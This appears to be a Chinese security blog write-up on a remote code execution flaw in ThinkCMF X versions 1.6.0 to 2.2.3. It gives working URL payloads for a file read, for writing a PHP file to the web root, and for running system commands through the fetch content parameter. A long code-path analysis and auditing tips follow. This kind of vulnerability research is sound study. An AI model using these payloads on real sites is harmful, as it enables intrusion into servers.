##  简介

**ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本。**

##  影响版本

> ThinkCMF X1.6.0
>
> ThinkCMF X2.1.0
>
> ThinkCMF X2.2.0
>
> ThinkCMF X2.2.1
>
> ThinkCMF X2.2.2
>
> ThinkCMF X2.2.3

##  复现环境

>
> 我这里下载的2.2.0版本，下载地址为：[thinkcmfx2.2.0](https://gitee.com/thinkcmf/ThinkCMFX/releases)

安装过程就略过了

##  漏洞复现

###  0x01

> payload:
> [http://localhost/thinkcmfx220/?a=display&templateFile=README.md](http://localhost/thinkcmfx220/?a=display&templateFile=README.md)

![](https://image.3001.net/images/20191028/1572229463_5db65157efd83.png!small)

###  0x02

    
    
    payload:?a=fetch&templateFile=public/index&prefix=''&content=file_put_contents('test.php','<?php phpinfo(); ?>')

上述请求发送后，会在thinkcmfx根目录生成test.php,我们访问一下：

![](https://image.3001.net/images/20191028/1572229469_5db6515deae6c.png!small)

###  0x03

    
    
    payload:?a=fetch&content=<?php system('ping xxxxxx');?>

这种方式其实利用和pyload2一样，只不过是直接执行系统命令，我们可以用dnslog的方式检验结果，如下

![](https://image.3001.net/images/20191028/1572229493_5db651755ff36.png!small)说明命令成功执行

##  漏洞分析

漏洞分析我可能不会把每行代码的意思讲清楚，但是我会分享一些我在分析这个漏洞时使用的一些小方法

审计mvc架构的应用，第一步就是找到入口，然后顺着入口文件，跟着程序逻辑读下去，直到了解程序大体运作流程，知道基本路由规则（mvc架构的审计工作主要是集中在控制器）。前面的审计开始的前置工作我就不细说了，而且在分析一个漏洞的时候这些前置工作也不一定是必须的，如果你在知道一些信息的情况下，例如，你根据漏洞披露的一些信息已经知道哪个文件有问题了，就不需要再去研究路由了，我这次的分析就是在已知一些条件的情况下进行的，所以我就没有仔细去读路由规则，所以，你也可以看到我后面的分析很多都采用的是猜测以及全局搜索这种方式来确定利用点，当然我后面也大概看了下路由，大概跟到App::exec()方法里，就可以看到路由规则了，如下：

![](https://image.3001.net/images/20191028/1572229516_5db6518c7b13f.png!small)前面说了那么多废话.....首先我们看下入口文件index.php确定应用目录

![](https://image.3001.net/images/20191028/1572229637_5db6520522ba1.png!small)我们到应用目录application里的controller看一下，根据路由或已知信息可以确定index.php的请求会被路由到indexcontroller.class.php的index()方法

![](https://image.3001.net/images/20191028/1572229690_5db6523aa70ff.png!small)这个方法也没啥，就是调用了个display显示了首页的内容。这些都不是问题的关键，关键的是thinkcmf是给予tinkphp再开发的，他有一些tp的特性，例如可以通过g\m\a参数指定分组\控制器\方法，这里可以通过a参数直接调用Portal\IndexController父类(HomebaseController)中的一些权限为public的方法。我们自己自己在HomebaseController类中创建一个public属性的方法

    
    
    public function test1(){
            echo 'hello axin';
            die();
        }

然后访问[http://localhost/thinkcmfx220/index.php?a=test1，结果如下](http://localhost/thinkcmfx220/index.php?a=test1%EF%BC%8C%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B)

![](https://image.3001.net/images/20191028/1572229733_5db65265b267a.png!small)说明确实是可以访问到public属性的函数的，此次漏洞主要是利用HomebaseController的display以及fetch方法，因为pyaload已经公开，那么我们就拿payload3：?a=fetch&content=<?php
system('ping xxxxxx');?>进行分析，看一下fetch方法，如下：

![](https://image.3001.net/images/20191028/1572229759_5db6527ff0d11.png!small)payload中只是传了一个content参数，那么此时的$templateFile值为空，$content值为php代码，继续跟进父类的fetch方法，这里的父类跟踪直接跟到了Controller.class.php中

![](https://image.3001.net/images/20191028/1572229782_5db65296a2958.png!small)可见这里执行$this->view->fetch,我们继续跟进，这里的view就是View.class.php中的类的实例

![](https://image.3001.net/images/20191028/1572229808_5db652b07ac49.png!small)我们主要关注的点是content变量，上面的代码有两个if...else语句，第一个很简单content不为空，所以执行else分支，第二个我们不能一眼判断出来，但是这里我们为了效率也就不去深究代码细节，我们只需要知道后面这个if....else语句到底是进入了哪个分支，所以，我们采用打印变量的方式，类似下面这样

    
    
    if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
            echo 33333333;
             $_content   =   $content;
             // 模板阵列变量分解成为独立变量
             extract($this->tVar, EXTR_OVERWRITE);
             // 直接载入PHP模板
             empty($_content)?include $templateFile:eval('?>'.$_content);
    }else{
        echo 444444444;
        // 视图解析标签
        $params = array('var'=>$this->tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);
        Hook::listen('view_parse',$params);
    }

这样当我们访问页面的时候，如果页面出现33333333，则表示进入了第一个分支，否则进入了第二个分支，但是如果跟着我的思路复现了的朋友可能会发现页面没有任何回显，这是因为这段代码前后分别调用了ob_start()与ob_get_clean()

![](https://image.3001.net/images/20191028/1572229831_5db652c72911a.png!small)这两个函数的配合会把我们的输出全部赋值给了$content变量，并不会直接输出到浏览器。所以，我们在分析的时候可以先注释掉这几句代码。然后根据页面输出我们就可以确定此处进入了else分支，分支里主要是执行了Hook::listen()函数，这个函数是tp里经常见的，以前我也不知道是干嘛的，这次我专门查了一下资料，这个Hook::listen函数就相当于是调用了一个提前注册好的类中的函数，函数默认是run函数，那么具体调用的是哪个类的run函数呢，这个就取决于传入的参数了，第一个参数是一个tag,这个tag是与一个类提前绑定的，第二个参数就是要传入run函数的参数啦。那么这个tag又是在哪里绑定到哪个类的呢？具体在哪个文件定义了映射我也不太清楚，所以，我直接采用全局搜索（phpstorm快捷键ctrl+shift+f）view_parse这个tag的方式，来寻找view_parse到底代表哪个类

![](https://image.3001.net/images/20191028/1572229853_5db652dd5d405.png!small)可以看到整个项目中出现view_parse的文件不多，最后我们确定到common.php,并在其中找到了view_parse对应的类就是Behavior\ParseTemplateBehavior

![](https://image.3001.net/images/20191028/1572229876_5db652f427455.png!small)既然都找到类了，那么就跟进去看一下啦，跟进发现里面确实有一个run函数，确定是他没错了

tips:这里跟踪文件也有个技巧，有时候在定位某个类位于哪个文件时，我们也可以采用全局搜索的方式，或者直接用类名搜索文件名(phpstorm快捷键，快速按两次shift)

![](https://image.3001.net/images/20191028/1572229898_5db6530a04bae.png!small)又有if分支，为了效率我们同样可以用刚刚说的方法，判断到底进入了哪个分支，可以注意到我在上面打了很多断点，这个断点是为了标示出哪些行是我自己添加的，或者标示一些重要的逻辑处，方便我后面审计结束删除自己添加的代码，也可以防止中途离开再回来看代码遗忘重点这种情况的发生，总之算是一个小技巧吧。

我这里用我的打印调试法定位到，代码会运行到Storage::load()这里，我们跟进，在这里我们使用phpstorm直接go
to这种方式发现phpstorm定位不到load函数的定义处，那么我们只有先定位Storage类，Storage类如下

![](https://image.3001.net/images/20191028/1572229919_5db6531fad0b8.png!small)发现Storage类里面根本就没有load方法，而且他也没有继承任何父类，那么load方法到底藏在哪里呢?这里就涉及到__callstatic这个模式方法啦，这个方法会在调用该类不存在的静态方法或变量时触发，所以，load方式是通过call_user_func_array函数调用的，那到底调用的哪里的load方法呀，这里有两种方式确定，一是老老实实看代码，搞清楚self::handler到底值为多少，第二种就是我采用的全局搜索的方法，我不想一行行看代码，直接全局搜索load(

![](https://image.3001.net/images/20191028/1572229939_5db653330bb79.png!small)出来的结果挺多的，但是我们根据之前调用时的参数，可以大体确定是上图中的其中一个，最后再结合自己的判断力或者都试一下确定是File.class.php（其实这里我是猜的23333，文件名更贴切嘛）中的load函数，跟进

![](https://image.3001.net/images/20191028/1572229956_5db65344e7add.png!small)结果发现，就只是引入了一个文件，我这就急眼了呀，我想这么就引入一个文件就完了呢，那我传入的content什么时候写入到这个文件的呀，我觉得我肯定是遗漏了什么东西，于是开始顺着这个文件找线索，看看到底哪里把传入的content写入了这个文件，还是用我们的打印调试法确定这个文件的路径在

> /data/runtime/Cache/Portal/

然后文件名的命名规则可以从传给Storage::load函数的参数里确定

    
    
    Storage::load(C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_SUFFIX'),$_data['var']);

我采用了几种方法来定位到底哪里把content写入了文件，第一种方式就是全局搜索C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_SUFFIX')

因为这是文件的命名规则，写入的时候肯定也是这个规则，但是结果失败了，只出现一条结果就是load这里，然后我就在想刚刚File.class.php里面有load函数，那么应该也有写入函数（set,write之类的），结果一看果然有！

![](https://image.3001.net/images/20191028/1572229979_5db6535b4f8fa.png!small)那我不得全局搜索一波嘛，在我搜索put的时候有所发现，再根据/data/runtime/Cache/Portal/目录下生成的cache文件的文件名、文件内容、调用put函数时传入的实参命名、实参个数以及调用put函数的文件名等多个数据参考，以及失措过后，觉得Template.class.php文件这一处put函数的调用极有可能就是了，这里的loadTemplate函数里有调用put函数的操作，反推，loadTemplate函数又在fetch函数里被调用了，然后我以为我之前跟代码的时候跟错了fetch,23333,回到ParseTemplateBehavior.class.php去确认

![](https://image.3001.net/images/20191028/1572230001_5db653713880b.png!small)回到ParseTemplateBehavior.class.php中才发现这个被我忽视的else分支，这里不就调用了template的fetch方法吗，于是喜上眉梢，那么什么时候会进入else分支呢

![](https://image.3001.net/images/20191028/1572230028_5db6538c3251f.png!small)

这里我做了一个合_Mask理的猜测，就是传入的参数是之前没有传过的，那么就会进入else,否则进入if,然后我在else分支添加了一行echo
444444;然后请求?a=fetch&content=phpinfo（这个请求是之前没有发送过的）

![](https://image.3001.net/images/20191028/1572230048_5db653a0ab350.png!small)果然页面打印处444444,说明进入了else分支，那么content的流向就很清晰了：

![](https://image.3001.net/images/20191028/1572230060_5db653ac5cf05.png!small)先是顺着上面的路径写入cache文件，最后调用Storage::load加载cache文件，最终导致代码执行。

啊～这一处的payload就先写到这吧，好久没写文章了，累死了～

 ***本文原创作者： _Mask，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  
  
  
  
  

